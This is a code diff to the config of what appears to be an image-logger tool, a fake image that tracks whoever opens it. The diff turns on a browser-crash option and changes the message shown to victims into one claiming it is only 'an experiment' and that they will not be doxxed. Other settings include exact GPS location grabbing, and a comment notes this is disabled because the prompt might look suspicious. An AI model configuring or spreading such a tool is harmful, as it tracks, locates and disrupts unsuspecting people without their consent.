@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "calonerrxsystems did it, dont worry you're in safe hands 🤡🤡", # Message to show
+        "message": "It is sad to say this but at this moment i am trying to freeze your laptops browser, this was done by calonerrxsystems™️ this isn't to harm you we will not dox you it's just to find out more about you as its an expiriment", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
